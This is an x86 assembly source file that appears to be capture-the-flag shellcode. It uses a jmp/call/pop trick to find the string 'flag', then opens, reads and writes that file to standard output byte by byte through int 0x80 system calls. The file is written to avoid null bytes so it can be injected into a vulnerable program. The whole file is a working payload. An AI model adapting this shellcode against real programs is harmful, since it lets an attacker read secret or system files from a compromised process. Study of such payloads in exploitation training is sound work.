#include <sys/syscall.h>
#define STRING "flag"
.globl main
.type  main, @function


main:
  xorl    %eax, %eax
  xorl    %ebx, %ebx
  xorl    %ecx, %ecx
  xorl    %edx, %edx
  jmp     calladdr

popladdr:
  popl    %esi             
  // open
  xorl    %eax, %eax        
  movb    $SYS_open,%al     
  movl    %esi,%ebx         
  xorl    %ecx,%ecx         
  int     $0x80 
  
  movl    %eax, %esi        
  jmp     readflag

exit:
  xorl    %ebx,%ebx               
  movl    %ebx,%eax
  inc     %eax                   
  int     $0x80            
readflag:
  // read
  movb    $SYS_read, %al    
  movl    %esi, %ebx        
  dec     %esp          
  leal    (%esp), %ecx      
  movb    $1, %dl           
  int     $0x80
 // check loop
  xorl    %ebx, %ebx
  cmp     %eax, %ebx        
  je      exit
  // write
  movb    $SYS_write, %al   
  movb    $1, %bl          
  leal    (%esp), %ecx     
  movb    $1, %dl          
  int     $0x80

  inc     %esp
  jmp     readflag

calladdr:
  call    popladdr
  .string STRING

